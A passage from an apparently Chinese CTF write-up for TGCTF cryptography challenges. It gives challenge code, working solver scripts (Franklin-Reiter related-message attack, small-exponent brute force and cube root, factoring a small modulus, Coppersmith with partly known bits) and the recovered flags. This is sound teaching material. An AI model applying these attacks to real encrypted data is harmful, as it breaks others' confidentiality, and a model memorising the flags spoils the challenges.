punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}</p>\n</blockquote>\n<h3 id=\"RwSiAns\"><a href=\"#RwSiAns\" class=\"headerlink\" title=\"RwSiAns\"></a>RwSiAns</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> FLAG\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> getPrime<span class=\"token punctuation\">,</span> bytes_to_long\n<span class=\"token keyword\">import</span> hashlib\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_key</span><span class=\"token punctuation\">(</span>bits<span class=\"token operator\">=</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span>\n    q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> p <span class=\"token operator\">*</span> q<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    x1<span class=\"token punctuation\">,</span> x2 <span class=\"token operator\">=</span> <span class=\"token number\">307</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span>\n    c1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    c2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> c1<span class=\"token punctuation\">,</span> c2\n\nm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>FLAG<span class=\"token punctuation\">)</span>\nn<span class=\"token punctuation\">,</span> e <span class=\"token operator\">=</span> generate_key<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nc1<span class=\"token punctuation\">,</span> c2 <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"e = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c1 = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c2 = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\nn <span class=\"token operator\">=</span> <span class=\"token number\">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>\ne <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nc1 <span class=\"token operator\">=</span> <span class=\"token number\">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>\nc2 <span class=\"token operator\">=</span> <span class=\"token number\">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span></code></pre>\n\n<p>基础的相关信息攻击</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> hashlib\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_key</span><span class=\"token punctuation\">(</span>bits<span class=\"token operator\">=</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span>\n    q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> p <span class=\"token operator\">*</span> q<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    x1<span class=\"token punctuation\">,</span> x2 <span class=\"token operator\">=</span> <span class=\"token number\">307</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span>\n    c1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    c2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m <span class=\"token operator\">+</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> c1<span class=\"token punctuation\">,</span> c2\n\n\nn <span class=\"token operator\">=</span> <span class=\"token number\">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>\ne <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nc1 <span class=\"token operator\">=</span> <span class=\"token number\">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>\nc2 <span class=\"token operator\">=</span> <span class=\"token number\">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span>\ns1<span class=\"token operator\">=</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span><span class=\"token number\">307</span><span class=\"token punctuation\">)</span>\ns2<span class=\"token operator\">=</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">franklinReiter</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    g1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>s1<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>e <span class=\"token operator\">-</span> c1\n    g2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>s2<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>e <span class=\"token operator\">-</span> c2\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">gcd</span><span class=\"token punctuation\">(</span>g1<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">while</span> g2<span class=\"token punctuation\">:</span>\n            g1<span class=\"token punctuation\">,</span> g2 <span class=\"token operator\">=</span> g2<span class=\"token punctuation\">,</span> g1 <span class=\"token operator\">%</span> g2\n        <span class=\"token keyword\">return</span> g1<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>gcd<span class=\"token punctuation\">(</span>g1<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\nm<span class=\"token operator\">=</span>franklinReiter<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}</p>\n</blockquote>\n<h3 id=\"宝宝rsa\"><a href=\"#宝宝rsa\" class=\"headerlink\" title=\"宝宝rsa\"></a>宝宝rsa</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> math <span class=\"token keyword\">import</span> gcd\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag\n\n<span class=\"token comment\"># PART1</span>\np1 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\nq1 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\nn1 <span class=\"token operator\">=</span> p1 <span class=\"token operator\">*</span> q1\nphi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nm1 <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\ne1 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">while</span> gcd<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    e1 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span>\nc1 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span> e1<span class=\"token punctuation\">,</span> n1<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p1 =\"</span><span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"q1 =\"</span><span class=\"token punctuation\">,</span> q1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c1 =\"</span><span class=\"token punctuation\">,</span> c1<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># PART2</span>\nn2 <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\ne2 <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nm2 <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nc2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> n2<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n2 =\"</span><span class=\"token punctuation\">,</span> n2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c2 =\"</span><span class=\"token punctuation\">,</span> c2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"e2 =\"</span><span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">)</span></code></pre>\n\n<p>flag分两段，前一段未知e，但是比较小，直接爆破就行，第二段e&#x3D;3，n为1024位，m应该比较小直接开方即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm\n\nphi1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> gcd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> phi1<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">continue</span>\n    d<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>phi1<span class=\"token punctuation\">)</span>\n    m1<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>p1<span class=\"token operator\">*</span>q1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">b'TGCTF'</span> <span class=\"token keyword\">in</span> m1<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">break</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># ---------------------------------------------------</span>\n<span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nm2<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m1<span class=\"token operator\">+</span>m2<span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}</p>\n</blockquote>\n<h3 id=\"费克特尔\"><a href=\"#费克特尔\" class=\"headerlink\" title=\"费克特尔\"></a>费克特尔</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">c<span class=\"token operator\">=</span><span class=\"token number\">670610235999012099846283721569059674725712804950807955010725968103642359765806</span>\nn<span class=\"token operator\">=</span><span class=\"token number\">810544624661213367964996895060815354972889892659483948276203088055391907479553</span>\ne<span class=\"token operator\">=</span><span class=\"token number\">65537</span></code></pre>\n\n<p>n很小直接yafu分一下,有很多因子,正常解即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nc<span class=\"token operator\">=</span><span class=\"token number\">670610235999012099846283721569059674725712804950807955010725968103642359765806</span>\nn<span class=\"token operator\">=</span><span class=\"token number\">810544624661213367964996895060815354972889892659483948276203088055391907479553</span>\ne<span class=\"token operator\">=</span><span class=\"token number\">65537</span>\n\np<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">916848439436544911290378588839845528581</span><span class=\"token punctuation\">,</span><span class=\"token number\">214168842768662180574654641</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2001511</span><span class=\"token punctuation\">,</span><span class=\"token number\">18251</span> <span class=\"token punctuation\">,</span><span class=\"token number\">113</span> <span class=\"token punctuation\">]</span>\nphi<span class=\"token operator\">=</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">:</span>\n    phi<span class=\"token operator\">*=</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nd<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{f4888_6abdc_9c2bd_9036bb}</p>\n</blockquote>\n<h3 id=\"EZRSA\"><a href=\"#EZRSA\" class=\"headerlink\" title=\"EZRSA\"></a>EZRSA</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">genarate_emojiiiiii_prime</span><span class=\"token punctuation\">(</span>nbits<span class=\"token punctuation\">,</span> base<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>base <span class=\"token operator\">//</span> <span class=\"token number\">32</span> <span class=\"token operator\">*</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> base <span class=\"token operator\">>=</span> <span class=\"token number\">3</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>nbits <span class=\"token operator\">//</span> <span class=\"token number\">8</span> <span class=\"token operator\">//</span> <span class=\"token number\">4</span> <span class=\"token operator\">-</span> base <span class=\"token operator\">//</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> get_random_emojiiiiii<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 猜一猜</span>\n        <span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> p\n\nm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>long_to_bytes<span class=\"token punctuation\">(</span>get_random_emojiiiiii<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> genarate_emojiiiiii_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">,</span> <span class=\"token number\">224</span><span class=\"token punctuation\">)</span>\nq <span class=\"token operator\">=</span> genarate_emojiiiiii_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\n\nn <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q\ne <span class=\"token operator\">=</span> <span class=\"token string\">\"💯\"</span>\nc <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> bytes_to_long<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p0 =\"</span><span class=\"token punctuation\">,</span> long_to_bytes<span class=\"token punctuation\">(</span>p <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">**</span> <span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n =\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c =\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n\np0 <span class=\"token operator\">=</span> <span class=\"token string\">'😘😾😂😋😶😾😳😷'</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span>\nc <span class=\"token operator\">=</span> <span class=\"token number\">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></code></pre>\n\n<p>根据genarate_emojiiiiii_prime(512, 224)发现,p的结构,高位为224位素数,低位为9个emoji一个32位</p>\n<p>题目给出了后8个emoji,查看每个emoji的十进制发现只有最后2位不一样,也就是说只爆破100个左右即可</p>\n<p>知道低32*9&#x3D;288位即可copper得到p</p>\n<p>e和phi有公共因子，有限域开方crt遍历一下即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np0_ <span class=\"token operator\">=</span> <span class=\"token number\">108837065531980906150333850570890620719343963272506332719822248235755953428663</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span>\nc <span class=\"token operator\">=</span> <span class=\"token 